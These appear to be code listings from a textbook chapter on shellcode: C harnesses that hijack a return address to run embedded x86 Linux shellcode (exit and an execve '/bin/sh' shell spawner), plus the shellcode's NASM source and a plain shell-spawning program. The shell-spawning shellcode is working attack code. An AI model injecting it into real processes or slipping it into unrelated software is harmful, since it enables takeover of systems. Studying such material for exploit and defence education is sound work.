# Chapter 3: Shellcode
## 1.c
```
char shellcode[] = "\xbb\x00\x00\x00\x00"           
                   "\xb8\x01\x00\x00\x00"                  
                   "\xcd\x80"; 

int main()
{
  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}
```

## 2.c
```
char shellcode[] = "\xbb\x00\x00\x00\x00"           
                   "\xb8\xfc\x00\x00\x00"                  
                   "\xcd\x80";                  

int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}
```
##
```
char shellcode[] =    
        "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
        "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
        "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41"
        "\x4b\x4b\x4b\x4b";               

int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}
```
## spawnshell.c
```
#include <stdio.h>
int main()
{
     char *happy[2];
     happy[0] = "/bin/sh";
     happy[1] = NULL;
     execve (happy[0], happy, NULL);
}
```
```
編譯==>  gcc spawnshell.c -o spawnshell
執行 ==> ./spawnshell
```
### 

```
char shellcode[] = "\xbb\x00\x00\x00\x00"           
                   "\xb8\x01\x00\x00\x00"                  
                   "\xcd\x80";                  

int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}
```

### exit.c
```

main()
{
        exit(0);
}
```
### execve2.c
```
//execve2.c
char shellcode[] =    
        "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
        "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
        "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41"
        "\x4b\x4b\x4b\x4b";               

int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}
```
### execve2.asm
```
 Section    .text

    global _start

_start:
       
    jmp short       GotoCall

shellcode:

     pop             esi               
     xor             eax, eax          
     mov byte        [esi + 7], al     
     lea             ebx, [esi]        
     mov long        [esi + 8], ebx    
     mov long        [esi + 12], eax   
     mov byte        al, 0x0b          
     mov             ebx, esi          
     lea             ecx, [esi + 8]    
     lea             edx, [esi + 12]   
     int             0x80

GotoCall:

     Call             shellcode
     db              '/bin/shJAAAAKKKK'
```
